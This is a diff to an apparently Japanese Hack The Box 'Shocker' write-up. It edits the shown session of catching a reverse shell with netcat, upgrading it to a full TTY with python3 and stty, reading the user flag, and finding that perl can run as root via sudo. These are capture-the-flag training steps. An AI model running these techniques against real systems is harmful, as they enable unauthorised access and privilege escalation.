@@ -147,14 +147,26 @@ STEP2のnmapスクリプトでもRCEできるが、シンプルに細工した�
 リバースシェル取得  
 ユーザフラグゲット！ルートフラグは権限拒否
 ```sh
-└─$ rlwrap nc -lnvp 4444                                      
+└─$ nc -lnvp 4444                                      
 listening on [any] 4444 ...
 connect to [10.10.14.70] from (UNKNOWN) [10.129.7.104] 36834
 bash: no job control in this shell
 
-shelly@Shocker:/usr/lib/cgi-bin$ tty
-tty
-not a tty
+shelly@Shocker:/usr/lib/cgi-bin$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+<-bin$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+                    
+shelly@Shocker:/usr/lib/cgi-bin$ ^Z
+zsh: suspended  nc -lnvp 4444
+
+└─$ stty raw -echo; fg
+[1]  + continued  nc -lnvp 4444
+                               ^C
+
+shelly@Shocker:/usr/lib/cgi-bin$ export SHELL=bash
+
+shelly@Shocker:/usr/lib/cgi-bin$ export TERM=xterm-256color
+
+shelly@Shocker:/usr/lib/cgi-bin$ stty rows 66 columns 236
 
 shelly@Shocker:/usr/lib/cgi-bin$ cat /home/shelly/user.txt
 cat /home/shelly/user.txt
@@ -170,8 +182,8 @@ ls: cannot open directory '/root': Permission denied
 sudoの設定不備を確認  
 パスワードなしでroot権限でperlを実行できるらしい
 ```sh
-shelly@Shocker:/usr/lib/cgi-bin$ sudo -l                                                                                                                                           
-Matching Defaults entries for shelly on Shocker:                                                                                                                                                                                            
+shelly@Shocker:/usr/lib/cgi-bin$ sudo -l
+Matching Defaults entries for shelly on Shocker:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
 User shelly may run the following commands on Shocker:
